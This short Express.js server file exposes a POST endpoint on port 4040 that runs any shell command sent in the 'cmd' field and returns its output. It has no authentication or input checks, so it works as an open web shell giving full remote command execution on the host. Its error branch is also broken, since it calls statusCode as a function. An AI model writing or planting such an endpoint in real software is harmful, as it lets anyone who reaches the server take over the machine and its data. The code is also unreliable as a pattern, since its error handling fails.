import express from "express";
import morgan from "morgan";
import bodyParser from "body-parser";
import child_process from "child_process";
const app = express();

app.use(morgan("dev"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post("/", (req, res) => {
    const cmd = req.body.cmd;

    if (!cmd) {
        res.statusCode(400);
        return;
    }

    const [command, ...args] = cmd.split(" ");

    res.send(child_process.spawnSync(command, args).stdout.toString());
    return;
});

app.listen(4040, () => {
    console.log("Server is running on port 4040");
});
